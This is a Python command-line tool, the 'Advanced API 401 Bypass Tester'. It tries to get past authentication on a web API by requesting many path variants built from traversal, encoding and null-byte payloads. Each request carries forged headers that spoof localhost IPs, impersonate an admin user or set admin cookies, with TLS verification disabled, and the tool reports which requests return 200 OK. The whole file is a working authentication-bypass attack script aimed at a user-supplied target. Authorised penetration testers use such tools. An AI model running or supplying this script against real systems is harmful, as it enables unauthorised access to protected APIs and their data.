import requests
import random
import time
import argparse
from urllib.parse import quote

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Headers to test
auth_headers = [
    {"Authorization": "Bearer test"},
    {"Authorization": "Bearer "},
    {"authorization": "Bearer test"},
    {"AUTHORIZATION": "Bearer test"},
    {"Authorization": "Basic Og=="},
    {"Authorization": "Digest test"},
    {"Authorization": "Negotiate test"},

    {"X-Api-Key": "test"},
    {"X-API-KEY": "test"},
    {"x-api-key": "test"},
    {"Api-Key": "test"},
    {"X-Access-Token": "test"},
    {"X-Token": "test"},
    {"X-JWT-Assertion": "test"},
    {"X-Amz-Security-Token": "test"},
    {"X-GitHub-Token": "test"},

    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},

    {"X-User": "admin"},
    {"X-Forwarded-User": "admin"},
    {"X-Authenticated-User": "admin"},
    {"X-Remote-User": "admin"},
    {"X-Original-User": "admin"},
    {"X-Impersonate-User": "admin"},
    {"Impersonate-User": "admin"},

    {"Cookie": "auth=1"},
    {"Cookie": "admin=true"},
    {"Cookie": "user=admin"},
    {"Cookie": "role=admin"},

    {"X-Anon": "1"},
    {"X-Anonymous": "true"},
    {"X-Guest": "true"},
    {"X-Override-Role": "admin"},
    {"X-Override-User": "admin"},
    {"X-Override-Token": "test"},

    {"X-HTTP-Method-Override": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Original-Method": "GET"},

    {"TE": "trailers, deflate"},
    {"Connection": "X-Super-Real-Header"},
    {"X-Fake-Header": "yes"},
]


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.68.0",
    "python-requests/2.28.1",
    "Mozilla/5.0 (Linux; Android 10; Mobile)",
    "PostmanRuntime/7.32.2"
]

bypass_payloads = [
    "", "/", ".", "/*", ";", ";/", ";.css", "%00", "%20", "%2f", "%3f", "%23", "%26",
    "%F3%A0%81%A9", "../", "..;/", ".json", "//", "/..;/", "/./", "/../", "/?", "??",
    "%2e%2e%2f", "%2e%2e/", "%2f", "%2e/", "%3b"
]

def generate_all_variants(base_path):
    base_path = base_path.strip()
    if not base_path.startswith("/"):
        base_path = "/" + base_path
    segments = base_path.strip("/").split("/")
    variants = set()

    # Suffix payloads
    for payload in bypass_payloads:
        variants.add(base_path + payload)

    # Prefix payloads
    for payload in bypass_payloads:
        variants.add(f"/{payload}" + base_path)

    # In-between segment injection
    for i in range(1, len(segments)):
        left = "/" + "/".join(segments[:i])
        right = "/".join(segments[i:])
        for payload in bypass_payloads:
            injected = f"{left}{payload}/{right}"
            variants.add(injected)

    return list(variants)

def test_paths(base_uri, path_list):
    success_log = []

    for raw_path in path_list:
        path_variants = generate_all_variants(raw_path)

        for path in path_variants:
            full_url = f"https://{base_uri}{path}"
            print(f"\n[+] Testing {full_url}")

            for method in ["GET", "POST"]:
                for h in auth_headers:
                    headers = h.copy()
                    headers["User-Agent"] = random.choice(user_agents)
                    try:
                        if method == "GET":
                            r = requests.get(full_url, headers=headers, timeout=6, verify=False)
                        else:
                            dummy_payload = {"test": "value"}
                            r = requests.post(full_url, headers=headers, json=dummy_payload, timeout=6, verify=False)

                        if r.status_code == 200:
                            success_log.append({
                                "method": method,
                                "url": full_url,
                                "headers": headers,
                                "length": len(r.text)
                            })
                            print(f"  ✅ 200 OK via {method} | {full_url}")
                            print(f"     ➤ Bypass Headers: {headers}")
                        else:
                            print(f"  {r.status_code} | {method} | {list(headers.keys())}")

                    except Exception as e:
                        print(f"  ERROR | {method} | {full_url} | {e}")
                    time.sleep(0.2)

    print("\n=== ✅ SUCCESSFUL BYPASSES ===")
    for s in success_log:
        print(f"[{s['method']}] {s['url']}")
        print(f"     Headers: {s['headers']}")
        print(f"     Response Length: {s['length']}")
        print("-" * 60)

def main():
    parser = argparse.ArgumentParser(description="🔥 Advanced API 401 Bypass Tester (Prefix, In-between, Suffix)")
    parser.add_argument("uri", help="Base URI (e.g., api.target.com)")
    parser.add_argument("path_file", help="Path list .txt file")
    args = parser.parse_args()

    with open(args.path_file, "r") as f:
        paths = f.readlines()

    test_paths(args.uri, paths)

if __name__ == "__main__":
    main()
